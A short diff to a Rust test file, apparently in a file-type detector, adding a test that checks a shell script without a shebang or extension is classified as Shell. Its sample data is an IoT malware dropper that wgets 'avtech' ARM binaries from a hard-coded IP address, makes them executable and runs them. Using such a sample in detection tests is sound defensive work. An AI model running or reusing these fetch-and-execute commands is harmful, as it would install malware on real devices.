@@ -1854,6 +1854,13 @@ message CommandMessage {
     }
 
     #[test]
+    fn shell_multarch_wget_loader_without_shebang_or_ext() {
+        let data = b"cd /tmp || /var/tmp; rm avtech.arm5; wget http://193.243.147.115/avtech.arm5; chmod 777 avtech.arm5; ./avtech.arm5\n\
+cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; chmod 777 avtech.arm7; ./avtech.arm7\n";
+        assert_detect("avTECH", data, FileType::Shell);
+    }
+
+    #[test]
     fn shell_empty_falls_back_to_ext() {
         let det = detect(Path::new("run.sh"), b"").unwrap();
         assert_eq!(det.file_type, FileType::Shell);
